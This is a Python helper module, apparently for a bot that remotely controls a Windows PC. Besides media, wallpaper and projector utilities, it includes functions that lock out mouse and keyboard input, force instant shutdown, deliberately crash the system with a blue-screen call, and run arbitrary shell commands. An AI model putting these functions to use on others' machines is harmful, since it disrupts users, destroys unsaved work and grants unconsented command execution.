import os
import sys
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

import pyautogui
from BotBase import mediaHandler#, data, Medium
import ctypes
import os
import subprocess
#import qrcode
from io import BytesIO
from PIL import Image
import pygame
import pygetwindow as gw
import pynput
#import cv2
#import random
import re
import webbrowser

#import ChromeReader
#import tempfile
#import shutil
#import uuid
#import os

import time

# Minimal locker base & mouse/keyboard lockers (used by GTLite)
class Locker:
    locked: bool = False

    @classmethod
    def lock(cls):
        if cls.locked:
            return False
        cls._lock()
        cls.locked = True
        return True

    @classmethod
    def unlock(cls):
        if not cls.locked:
            return False
        cls._unlock()
        cls.locked = False
        return True

    @classmethod
    def _lock(cls):
        pass

    @classmethod
    def _unlock(cls):
        pass

class MouseLocker(Locker):
    listener: pynput.mouse.Listener = None

    @classmethod
    def _lock(cls):
        cls.listener = pynput.mouse.Listener(suppress=True)
        cls.listener.start()

    @classmethod
    def _unlock(cls):
        if cls.listener:
            cls.listener.stop()
            cls.listener = None

class KeyboardLocker(Locker):
    listener: pynput.keyboard.Listener = None

    @classmethod
    def _lock(cls):
        cls.listener = pynput.keyboard.Listener(suppress=True)
        cls.listener.start()

    @classmethod
    def _unlock(cls):
        if cls.listener:
            cls.listener.stop()
            cls.listener = None

# Window helpers (used by GTLite)

def hotkey(*wargs):
    keyboard_locked = KeyboardLocker.locked

    if keyboard_locked:
        KeyboardLocker.unlock()
    pyautogui.hotkey(*wargs)
    if keyboard_locked:
        KeyboardLocker.lock()

def hide_windows():
    hotkey("win", "d")

def show_windows():
    hotkey("win", "d")

def close_window():
    hotkey("alt", "f4")

def close_tab():
    hotkey("ctrl", "w")

# Shutdown / restart / logoff / hibernate / crash (used by GTLite)
def shutdown():
    try:
        os.system("shutdown /s /f /t 0")
        return True
    except:
        return False

def restart():
    try:
        os.system("shutdown /r /f /t 0")
        return True
    except:
        return False

def logoff():
    try:
        os.system("shutdown /l")
        return True
    except:
        return False

def hibernate():
    try:
        os.system("shutdown /h")
        return True
    except:
        return False

def crash():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, None, None, 6, ctypes.byref(ctypes.c_uint()))
        return True
    except:
        return False

# Programs
def open_notepad(text: str | None = None, delete_after: bool = False):
    path = "notepad.txt"
    with open(path, "w", encoding="utf-8") as txt_file:
        txt_file.write(text or "")

        subprocess.Popen(["notepad.exe", path])

        txt_file.close()

        # Delete file
        if delete_after:
            while True:
                try:
                    os.remove(path)
                    break
                except:
                    time.sleep(0.2)

def execute_cmd(cmd: str) -> str:
    return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout

def is_url(text: str):
    return re.search(r'(https?://\S+)', text)

def open_site(url_or_query: str):
    if is_url(url_or_query):
        webbrowser.open_new(url_or_query)
    else:
        webbrowser.open_new(f"https://www.google.com/search?q={url_or_query}")

# Image
def image_to_buffer(image: Image.Image):
    buffer = BytesIO()
    image.save(buffer, format="JPEG")
    buffer.seek(0)

    return buffer

# Projector / display helpers
def disconnect_lim():
    try:
        subprocess.run(["DisplaySwitch.exe", "/internal"])
        return True
    except:
        return None

def connect_lim():
    try:
        subprocess.run(["DisplaySwitch.exe", "/clone"])
        return True
    except:
        return None

# Media classes
class Photo(mediaHandler.File):
    def set_as_wallpaper(self):
        absolute_path = os.path.abspath(self.path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, absolute_path, 0)

pygame.mixer.init()

class AudioManager:
    sounds: dict[str, pygame.mixer.Sound] = {}

    @classmethod
    def get(cls, path):
        if path in cls.sounds:
            return cls.sounds[path]
        sound = pygame.mixer.Sound(path)
        cls.sounds[path] = sound
        return sound

    @classmethod
    def stop_all(cls):
        for sound in cls.sounds.values():
            sound.stop()

class Audio(mediaHandler.File):
    def __init__(self, medium: mediaHandler.Medium):
        super().__init__(medium)
        self.sound = AudioManager.get(self.path)

    def play(self):
        self.sound.play()

    def stop(self):
        self.sound.stop()

class Video(mediaHandler.File):
    def close(self):
        if windows := gw.getWindowsWithTitle("Lettore multimediale"):
            for window in windows:
                window.close()
        else:
            close_window()

# GTE
class GTEFiles:
    PATH: str = "GTEFiles"

    @classmethod
    def files(cls):
        return (filename.removesuffix(".gte") for filename in os.listdir(cls.PATH))


    @classmethod
    def load(cls, name: str):
        file_path = os.path.join(cls.PATH, name+ ".gte")
        
        with open(file_path, "r") as file:
            code = file.read()

        return code
    
    @classmethod
    def save(cls, name: str, code: str):
        file_path = os.path.join(cls.PATH, name + ".gte")
        
        with open(file_path, "w") as file:
            file.write(code)

    @classmethod
    def delete(cls, name: str):
        file_path = os.path.join(cls.PATH, name + ".gte")

        os.remove(file_path)
